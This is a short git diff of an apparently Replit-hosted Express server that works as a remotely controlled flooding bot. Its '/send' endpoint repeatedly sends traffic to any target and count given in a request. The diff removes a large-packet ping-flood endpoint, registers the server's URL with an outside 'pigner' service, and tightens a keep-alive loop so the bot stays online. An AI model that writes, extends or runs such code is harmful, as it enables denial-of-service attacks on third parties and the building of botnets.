@@ -3,7 +3,6 @@ const express = require('express')
 const app = express()
 const bodyParser = require('body-parser')
 const axios = require('axios')
-var ping = require ("net-ping");
 var remainding = 500
 function sleep(ms) {
     return new Promise((resolve) => {
@@ -32,23 +31,6 @@ app.post('/send', (req, res) => {
   for (i = 0; i < req.body.count; i++) {
     send(req.body.target, 500)
     console.log("iteration : "+i+" out of "+req.body.count)
-  }
-})
-app.post("/ping", (req,res) => {
-  res.status(200).json({
-    message: 'OK'
-  })
-  let target = req.body.target
-  console.log("RECIEVED PING")
-  console.log(req.body.count)
-  for (i = 0; i < req.body.count; i++) {
-    var session = ping.createSession ({packetSize: 64000});
-    session.pingHost (target, function (error, target) {
-    if (error)
-        console.log (target + ": " + error.toString ());
-    else
-        console.log (target + ": Alive");
-});
   }
 })
 
@@ -86,11 +68,13 @@ axios.get("https://pigner.1nchpp.repl.co/add?url="+`https://${process.env.REPL_S
 const main = new Promise(async (resolve)=>{	
   const i = 0
      while (i < 10) {	
-  await sleep(5000)	
+  await sleep(2000)	
 
   await axios.get(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`)	
   .then(function (response) {	
     console.log(response.data);	
-  })}	
+  })
+  .catch((err)=>{console.log("what")})
+     }	
 
      })
